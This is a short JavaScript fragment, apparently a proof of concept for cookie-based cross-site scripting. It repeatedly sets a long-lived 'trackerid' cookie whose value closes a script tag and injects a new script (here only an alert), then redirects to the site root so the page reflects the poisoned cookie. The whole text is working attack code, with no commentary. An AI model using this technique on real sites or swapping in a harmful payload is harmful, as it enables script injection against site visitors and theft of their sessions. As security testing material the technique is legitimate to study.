"";
setInterval(function() {
    document.cookie = "trackerid=ao\"</script><script>alert('payload in cookies, again')</script>\"; expires=Fri, 31 Dec 9999 23:59:59 GMT; path=/"
}, 300);
setTimeout(function() {
    window.location = '/'
}, 1500);
